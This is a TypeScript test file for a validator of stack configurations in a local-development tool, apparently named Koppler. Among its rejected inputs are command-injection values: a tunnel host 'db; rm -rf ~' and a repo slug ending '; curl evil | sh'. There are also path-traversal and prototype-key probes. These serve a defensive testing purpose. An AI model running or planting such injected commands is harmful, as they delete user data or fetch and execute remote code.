import { expect, test } from 'vitest';
import { SECRET_TYPES } from './secret-types.ts';
import { StackSchema, validateStack, type Stack } from './stack.ts';

const app = { name: 'Orders API', kind: 'dotnet', slug: 'acme/orders-api' };
const stack = (extra: object = {}) => ({
  envs: ['qa', 'prod'],
  apps: { orders: app, web: { ...app, name: 'Web' } },
  ...extra,
});
const web = (extra: object) => stack({ apps: { orders: app, web: { ...app, ...extra } } });

test('a stack that can be used has nothing wrong with it, and is typed', () => {
  const full = stack({
    name: 'Acme Shop',
    protected: ['prod'],
    envAliases: { qa: ['test', 'dev'] },
    kinds: { elixir: { label: 'Elixir', detect: ['mix.exs'], start: 'mix phx.server' } },
    queues: { thumbs: { name: 'Thumbnails', type: 'sqs', queue: 'thumbs-qa', envs: { prod: { queue: 'thumbs' } } } },
    checks: [{ name: 'vpn', run: 'pgrep -x vpnd' }],
    resources: {
      receipts: {
        type: 's3',
        name: 'Receipts',
        bucket: 'acme-receipts-qa',
        envs: { prod: { bucket: 'acme-receipts' } },
      },
      api: { type: 'apigw', name: 'Public API', routes: { 'POST /orders': 'orders', 'POST /thumbs': 'queue:thumbs' } },
      refunds: {
        type: 'sfn',
        name: 'Refunds',
        startedBy: ['orders'],
        steps: [{ name: 'Check' }, { name: 'Pay', calls: 'web' }],
      },
    },
    presets: [{ name: 'Both', version: 1, nodes: { orders: {}, web: {} }, edges: [{ from: 'web', to: 'orders' }] }],
    apps: {
      orders: {
        ...app,
        url: 'https://localhost:7001',
        prereqs: [{ sso: 'acme-qa' }, { tunnel: 'db.qa.acme.example', port: 5432, env: 'ConnectionStrings__Db' }],
        secrets: [{ env: 'ConnectionStrings__Db', type: 'postgres' }],
        publishes: { thumbs: {} },
        buckets: { receipts: { access: 'write' } },
        envs: { prod: { prereqs: [{ tunnel: 'db.acme.example', port: 5432 }], start: 'dotnet run' } },
        localChanges: [{ file: 'src/Startup.cs', find: 'a', replace: 'b' }],
      },
      web: { name: 'Web', kind: 'elixir', slug: 'acme/web', consumes: { orders: { how: 'env', env: ['ORDERS_URL'] } } },
      crm: { name: 'CRM', kind: 'other', outside: 'a SaaS' },
    },
  });
  expect(validateStack(full)).toEqual([]);
  const typed: Stack = StackSchema.parse(full);
  expect(typed.apps['orders']?.prereqs?.[1]?.port).toBe(5432);
  // What the schema does not name is kept as it is.
  expect(StackSchema.parse(stack({ notes: 'read me first' }))).toMatchObject({ notes: 'read me first' });
});

test('whatever it is given, it answers with reasons and never throws', () => {
  for (const notAStack of [null, undefined, 3, 'text', [], () => 1])
    expect(validateStack(notAStack)).toEqual(['a stack is an object with envs and apps']);
  expect(validateStack({})).toEqual([
    'envs: a non-empty list of lowercase names, each once',
    'apps: an object keyed by app id',
  ]);
  expect(validateStack({ envs: ['qa'], apps: { web: 7, api: { name: 'API' } } })).toEqual([
    'apps.web: an object',
    'apps.api.kind: required',
    'apps.api.slug: required',
  ]);
});

test('each part is named where it is wrong', () => {
  const cases: [object, string][] = [
    [web({ prereqs: [{ tunnel: 'db; rm -rf ~', port: 5432 }] }), 'apps.web.prereqs[0].tunnel: a host name'],
    [web({ prereqs: [{ port: '5432' }] }), 'apps.web.prereqs[0].port: a port number from 1 to 65535'],
    [
      web({ envs: { prod: { prereqs: [{ port: 70000 }] } } }),
      'apps.web.envs.prod.prereqs[0].port: a port number from 1 to 65535',
    ],
    [web({ secrets: [{ env: 'DB URL' }] }), 'apps.web.secrets[0].env: a setting name'],
    [
      web({ secrets: [{ env: 'DB', type: 'oracle' }] }),
      `apps.web.secrets: type "oracle" is not one Koppler tests (${SECRET_TYPES.join(', ')})`,
    ],
    [
      web({ secrets: [{ env: 'NODE_OPTIONS' }] }),
      'apps.web: "NODE_OPTIONS" cannot be a secret or a cable setting; it changes what code the app runs',
    ],
    [web({ consumes: { ghost: {} } }), 'apps.web.consumes.ghost: no such app'],
    [
      web({ consumes: { orders: { how: 'set in the admin panel' } } }),
      'apps.web.consumes.orders.how: one of env, env-file, edit, secret, unknown; anything else in words goes in note',
    ],
    [web({ consumes: { constructor: {} } }), 'apps.web.consumes.constructor: no such app'],
    [web({ envs: { staging: {} } }), 'apps.web.envs.staging: not one of envs (qa, prod)'],
    [web({ start: 'x'.repeat(2001) }), 'apps.web.start: a shell command (up to 2000 characters)'],
    [
      web({ localChanges: [{ file: '../x', find: 'a', replace: 'b' }] }),
      "apps.web.localChanges[0]: needs file (a path inside the app's clone, no .. or leading /), find and replace",
    ],
    [web({ slug: 'acme/web; curl evil | sh' }), 'apps.web.slug: owner/repo, or host/path/to/repo'],
    [
      stack({ protected: ['live'] }),
      'protected: a list of environments from envs (the ones that ask before every secret read and get the careful review)',
    ],
    [stack({ kinds: { go: { label: 'Mine' } } }), 'kinds.go: Koppler already has a kind with this id'],
    [stack({ resources: { r: { type: 'blob', name: 'R' } } }), 'resources.r.type: one of s3, apigw, sfn'],
    [
      stack({ resources: { r: { type: 'apigw', name: 'R', routes: { orders: 'orders' } } } }),
      'resources.r.routes.orders: an object keyed by route, such as POST /orders',
    ],
    [
      stack({ resources: { r: { type: 'apigw', name: 'R', routes: { 'GET /': 'queue:ghost' } } } }),
      'resources.r.routes.GET /: no such app, or queue:<id> under "queues"',
    ],
    [
      stack({ resources: { r: { type: 'sfn', name: 'R', startedBy: ['ghost'] } } }),
      'resources.r.startedBy[0]: no such app',
    ],
    [
      stack({ resources: { r: { type: 'sfn', name: 'R', steps: [{ name: 'A', calls: 'ghost' }] } } }),
      'resources.r.steps[0].calls: no such app',
    ],
    [
      stack({ resources: { r: { type: 's3', name: 'R', envs: { live: {} } } } }),
      'resources.r.envs.live: must be one of envs',
    ],
    [web({ buckets: { r: { access: 'read' } } }), 'apps.web.buckets.r: no such s3 resource under "resources"'],
    [web({ buckets: { r: { access: 'all' } } }), 'apps.web.buckets.r.access: one of read, write, both'],
    [
      stack({ queues: { q: { name: 'Q', type: 'rabbit' } } }),
      'queues.q.type: one of sqs, sns, eventbridge, kafka, other',
    ],
    [
      stack({ checks: [{ name: 'vpn' }] }),
      'checks[0]: needs a name (up to 80 characters) and a run command (up to 2000)',
    ],
    [
      stack({ presets: [{ name: 'P', version: 99, nodes: { orders: {} } }] }),
      'presets[0].version: 99 is newer than this Koppler reads (1); update Koppler',
    ],
    [
      stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: [{ from: 'orders', to: 'web' }] }] }),
      'presets[0].edges: orders -> web needs both apps in the preset',
    ],
  ];
  for (const [bad, problem] of cases) expect(validateStack(bad), problem).toContain(problem);
});

test('a stack declares its own sign-ins, and an app names one that exists', () => {
  const azure = { what: 'Azure', check: 'az account show', login: 'az login', env: { AZURE_TENANT_ID: 'acme' } };
  const using = (name: string, signIns: object = { 'acme-dev': azure }) =>
    stack({ signIns, apps: { orders: { ...app, prereqs: [{ signIn: name }] } } });
  expect(validateStack(using('acme-dev'))).toEqual([]);
  expect(validateStack(using('other'))).toContain(
    'apps.orders.prereqs[0].signIn: no sign-in called other under signIns',
  );
  expect(validateStack(using('acme-dev', { 'acme-dev': { what: 'Azure', login: 'az login' } })).join()).toMatch(
    /signIns\.acme-dev\.check/,
  );
});

test('a queue feeds other queues by a pipe, a rule or a subscription, and an app says how it reads one', () => {
  const queues = {
    topic: { name: 'Orders created', type: 'kafka', feeds: { bus: { via: 'pipe' } } },
    bus: { name: 'Orders bus', type: 'eventbridge' },
  };
  const reads = web({ reads: { bus: { via: 'rule to Lambda' } } });
  expect(validateStack(stack({ queues, apps: reads.apps }))).toEqual([]);
  const wrong = (extra: object, at: string) =>
    expect(validateStack(stack({ queues: { ...queues, ...extra } })).join('\n')).toContain(at);
  wrong({ topic: { ...queues.topic, feeds: { ghost: { via: 'pipe' } } } }, 'queues.topic.feeds.ghost: no such queue');
  wrong(
    { topic: { ...queues.topic, feeds: { topic: { via: 'pipe' } } } },
    'queues.topic.feeds.topic: a queue cannot feed itself',
  );
  wrong({ topic: { ...queues.topic, feeds: { bus: { via: 'carrier pigeon' } } } }, 'pipe, rule or subscription');
  expect(validateStack(stack({ queues, apps: web({ reads: { bus: { via: 7 } } }).apps })).join('\n')).toContain(
    'apps.web.reads.bus.via: how it is read',
  );
});
